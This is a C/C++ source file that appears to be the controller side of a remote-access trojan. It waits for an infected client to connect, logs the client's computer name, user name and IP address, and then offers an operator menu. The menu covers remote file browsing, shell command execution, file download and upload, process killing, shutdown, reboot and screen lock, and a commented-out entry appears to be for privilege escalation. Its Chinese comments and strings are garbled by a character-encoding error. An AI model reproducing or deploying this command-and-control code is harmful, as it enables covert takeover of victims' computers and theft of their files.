#include "../tcpSocket/tcpSocke.h"

int process(SOCKET clifd);

int main()
{
	init_Socket();

	SOCKET serfd = CreatServerScoket();

	printf("�ȴ�����...\n");

	SOCKET clifd = accept(serfd, NULL, NULL);	//����пͻ�����������
	if (clifd == INVALID_SOCKET)
	{
		//err("accept");
	}
	char buf[BUFSIZ] = { 0 };

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//�������ӳɹ������
	{
		decode(buf);
		printf("%s\n", buf);
	}
	memset(buf, 0, sizeof(buf));//��������ʼ������ֹ�ظ����

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//�������
	{
		decode(buf);
		printf("�������Ϊ :%s\n", buf);
	}
	memset(buf, 0, sizeof(buf));

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//�û���
	{
		decode(buf);
		printf("�û���Ϊ :%s\n", buf);
	}
	memset(buf, 0, sizeof(buf));

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//IP��ַ
	{
		decode(buf);
		printf("IPΪ  :%s\n", buf);
	}
	memset(buf, 0, sizeof(buf));

	thread th = thread(process, clifd);
	th.detach();
	char beat[20] = { 0 };
	while (true)
	{
		rewind(stdin);
		if (recv(clifd, beat, 20, 0) > 0)
		{
			//decode(beat);
			printf("%s\n", beat);
		}
	}
	close_Socket();
	return 0;
}

int process(SOCKET clifd)
{
	char code[50] = { 0 };
	char sendbuf[BUFSIZ] = { 0 };
	while (true)
	{
		printf("��������ȷ��ָ��: \n");
		printf("���� -help ���������ʾ��\n\n");
		rewind(stdin);
		scanf("%s", code);//���벢����ָ��
		encode(code);
		send(clifd, code, 50, 0);
		decode(code);
		if (!strcmp(code, "-help"))
		{
			printf("\n������ʾ\n");
			printf("1. filebrowse:			�ļ����\n");
			printf("2. shell:			ִ��shellָ��\n");
			printf("3. download:			�ļ�����\n");
			printf("4. upload:			�ļ��ϴ�\n");
			//printf("5. upright:			��Ȩ\n");
			printf("6. kill:			ɱ������\n");
			printf("7. shutdown:			�ػ�\n");
			printf("8. reboot:			����\n");
			printf("9. cancel:			ȡ���ػ�\n");
			printf("10.lock:			����\n");
		}
		else if (!strcmp(code, "filebrowse"))
		{
			char file[Row] = { 0 };//���塢��ʼ����������ʾ
			char path[50] = { 0 };

			printf("�������� 'D:' ����ȡD��Ŀ¼�µ������ļ���\n");
			cin >> path;
			encode(path);
			send(clifd, path, 50, 0);
			while (recv(clifd, sendbuf, BUFSIZ, 0) > 0)
			{
				if (sendbuf[0] == 0)
				{
					continue;
				}
				printf("%s\n", sendbuf);
			}
		}
		else if (!strcmp(code, "shell"))
		{
			char shell[BUFSIZ] = { 0 };
			char res[BUFSIZ * 10] = { 0 };
			printf("��������ȷ��shellָ��: \n");
			printf("���ָ����󣬽���ˢ�£�������ѡ��shell���ٴ�������ȷ��ָ��.\n");
			rewind(stdin);
			scanf("%s", shell);
			rewind(stdin);
			encode(shell);
			send(clifd, shell, BUFSIZ, 0);
			rewind(stdin);
			if (recv(clifd, res, BUFSIZ * 10, 0) > 0)
			{
				rewind(stdin);
				//decode(res);
				printf("%s\n", res);
			}
			continue;
		}
		else if (!strcmp(code, "download"))
		{
			printf("������Ҫ���ص��ļ���:\n");
			rewind(stdin);
			scanf("%s", sendbuf);
			send(clifd, sendbuf, BUFSIZ, 0);
			ZeroMemory(sendbuf, sizeof(sendbuf));
			recv(clifd, sendbuf, BUFSIZ, 0);
			FILE* fp = fopen("D:\\vsfiles\\test\\x64\\Release\\file.txt", "w");
			if (fp == NULL)
			{
				printf("�ļ���ʧ��");
				continue;
			}
			int ret = recv(clifd, sendbuf, BUFSIZ, 0);

			int write_length = fwrite(sendbuf, sizeof(char), ret, fp);
			if (write_length < ret)
			{
				printf("�ļ�д��ʧ��!\n");
				continue;
			}
			memset(sendbuf, 0, sizeof(sendbuf));   //��ս��ջ�����
			fclose(fp);
			continue;
		}
		else if (!strcmp(code, "upload"))
		{
			printf("������Ҫ�ϴ����ļ���:\n");
			rewind(stdin);
			scanf("%s", sendbuf);
			send(clifd, sendbuf, BUFSIZ, 0);
			FILE* fp = fopen(sendbuf, "r");
			if (fp == NULL)
			{
				printf("�� %s �ļ�ʧ��!\n", sendbuf);
			}
			else
			{
				char buffer[BUFSIZ];
				printf("�ɹ��� %s �ļ�!\n", sendbuf);
				ZeroMemory(buffer, BUFSIZ);
				int file_block_length = 0;
				//ѭ�����ļ�file_name(fp)�е����ݶ�ȡ��buffer��
				while ((file_block_length = fread(buffer, sizeof(char), BUFSIZ, fp)) > 0)
				{

					// ����buffer�е��ַ������ͻ���  
					if (send(clifd, buffer, file_block_length, 0) < 0)
					{
						printf("�ļ� %s ����ʧ��!\n", sendbuf);
						break;
					}
					//���buffer������
					ZeroMemory(buffer, sizeof(buffer));
				}
				fclose(fp);  			//�ر��ļ�������fp
				printf("�ļ� %s ����ɹ�!\n", sendbuf);
			}
			continue;
		}
		else if (strcmp(code, "kill") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				printf("%s\n", sendbuf);
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "reboot") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				printf("%s\n", sendbuf);
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "shutdown") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				printf("%s\n", sendbuf);
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "lock") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				printf("%s\n", sendbuf);
			}
			rewind(stdin);
			continue;
		}
		else
		{
			printf("ָ�����\n\n");
			continue;
			rewind(stdin);
		}
		ZeroMemory(code, sizeof(code));
		rewind(stdin);
	}
	return 0;
}